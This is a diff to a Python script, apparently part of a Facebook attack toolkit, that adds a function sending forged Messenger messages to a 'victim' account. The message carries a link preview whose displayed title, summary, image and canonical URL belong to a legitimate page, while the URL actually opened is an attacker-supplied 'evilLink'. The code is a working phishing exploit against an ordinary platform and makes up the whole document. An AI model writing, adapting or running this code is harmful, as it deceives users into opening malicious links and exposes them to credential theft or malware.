@@ -859,7 +859,102 @@ def hijackVideo(videoLink,title,summary,comment,videoID,hijackedVideo):
 #        except:
 #            print 'Ctrl+c SIGNAL Caught\n'
 #            return
+
+
+def privateMessageLink(message,victim,subject,realLink,title,summary,imageLink,evilLink):
+    
+    c_user = getC_user()
+    
+    try:
+        set_dtsg()
+        arguments = {
+            'w' : '398',
+            'message_batch[0][action_type]' : 'ma-type:user-generated-message',
+            'message_batch[0][thread_id]' : '',
+            'message_batch[0][author]' : 'fbid:'+c_user,
+            'message_batch[0][author_email]' : '',
+            'message_batch[0][coordinates]' : '',
+            'message_batch[0][timestamp]' : '1387237764222',
+            'message_batch[0][timestamp_absolute]' : 'Today',
+            'message_batch[0][timestamp_relative]' : '8:49pm',
+            'message_batch[0][timestamp_time_passed]' : '0',
+            'message_batch[0][is_unread]' : 'false',
+            'message_batch[0][is_cleared]' : 'false',
+            'message_batch[0][is_forward]' : 'false',
+            'message_batch[0][is_filtered_content]' : 'false',
+            'message_batch[0][is_spoof_warning]' : 'false',
+            'message_batch[0][source]' : 'source:titan:web',
+            'message_batch[0][body]' : message,
+            'message_batch[0][has_attachment]' : 'true',
+            'message_batch[0][html_body]' : 'false',
+            'message_batch[0][specific_to_list][0]' : 'fbid:' + victim,
+            'message_batch[0][force_sms]' : 'true',
+            'message_batch[0][ui_push_phase]' : 'V3',
+            'message_batch[0][content_attachment][subject]' : subject,
+            'message_batch[0][content_attachment][app_id]' : '2309869772',
+            'message_batch[0][content_attachment][attachment][params][urlInfo][canonical]' : realLink,
+            'message_batch[0][content_attachment][attachment][params][urlInfo][final]' : realLink,
+            'message_batch[0][content_attachment][attachment][params][urlInfo][user]' : evilLink,
+            'message_batch[0][content_attachment][attachment][params][favicon]' : 'http://www.whatever.com/favicon.ico',
+            'message_batch[0][content_attachment][attachment][params][title]' : title,
+            'message_batch[0][content_attachment][attachment][params][summary]' : summary,
+            'message_batch[0][content_attachment][attachment][params][images][0]' : imageLink,
+            'h' : '208',
+            'url' : imageLink,
+            'cfs' : '1',
+            'message_batch[0][content_attachment][attachment][params][medium]' : '106',
+            'message_batch[0][content_attachment][attachment][params][url]' : realLink,
+            'message_batch[0][content_attachment][attachment][type]' : '100',
+            'message_batch[0][content_attachment][link_metrics][source]' : 'ShareStageExternal',
+            'message_batch[0][content_attachment][link_metrics][domain]' : 'www.mkit.com.ar',
+            'message_batch[0][content_attachment][link_metrics][base_domain]' : 'mkit.com.ar',
+            'message_batch[0][content_attachment][link_metrics][title_len]' : '38',
+            'message_batch[0][content_attachment][link_metrics][summary_len]' : '180',
+            'message_batch[0][content_attachment][link_metrics][min_dimensions][0]' : '70',
+            'message_batch[0][content_attachment][link_metrics][min_dimensions][1]' : '70',
+            'message_batch[0][content_attachment][link_metrics][images_with_dimensions]' : '3',
+            'message_batch[0][content_attachment][link_metrics][images_pending]' : '0',
+            'message_batch[0][content_attachment][link_metrics][images_fetched]' : '0',
+            'message_batch[0][content_attachment][link_metrics][image_dimensions][0]' : '856',
+            'message_batch[0][content_attachment][link_metrics][image_dimensions][1]' : '566',
+            'message_batch[0][content_attachment][link_metrics][images_selected]' : '3',
+            'message_batch[0][content_attachment][link_metrics][images_considered]' : '5',
+            'message_batch[0][content_attachment][link_metrics][images_cap]' : '3',
+            'message_batch[0][content_attachment][link_metrics][images_type]' : 'ranked',
+            'message_batch[0][content_attachment][composer_metrics][best_image_w]' : '398',
+            'message_batch[0][content_attachment][composer_metrics][best_image_h]' : '208',
+            'message_batch[0][content_attachment][composer_metrics][image_selected]' : '0',
+            'message_batch[0][content_attachment][composer_metrics][images_provided]' : '3',
+            'message_batch[0][content_attachment][composer_metrics][images_loaded]' : '3',
+            'message_batch[0][content_attachment][composer_metrics][images_shown]' : '3',
+            'message_batch[0][content_attachment][composer_metrics][load_duration]' : '0',
+            'message_batch[0][content_attachment][composer_metrics][timed_out]' : '0',
+            'message_batch[0][content_attachment][composer_metrics][sort_order]' : '',
+            'message_batch[0][content_attachment][composer_metrics][selector_type]' : 'UIThumbPager_6',
+            'message_batch[0][status]' : '0',
+            'message_batch[0][message_id]' : '<1387237764222:1517510061-619853692@mail.projektitan.com>',
+            'client' : 'mercury',
+            '__user' : c_user,
+            '__a' : '1',
+            '__dyn' : '7n8a9EAMNpGvyVQ9UmWOGUGy6zECQqbx2mbAKGiCw',
+            '__req' : 'f',
+            'fb_dtsg' : br.form['fb_dtsg'],
+            '__rev' : '1048858',
+            'ttstamp' : '265816888106986872',
+            }
+        datos = urlencode(arguments)
+        response = br.open('https://www.facebook.com/ajax/mercury/send_messages.php ',datos)
         
+        if globalLogging:
+                logs(response.read())
+    
+    except mechanize.HTTPError as e:
+        print e.code
+    except mechanize.URLError as e:
+            print e.reason.args         
+    except:
+        print 'Ctrl+c SIGNAL Caught\n'
+        return
 
 def privateMessagePhishing(victimId,message,subject,evilLink,videoLink,title,summary,videoID,hijackedVideo):
     c_user = getC_user()
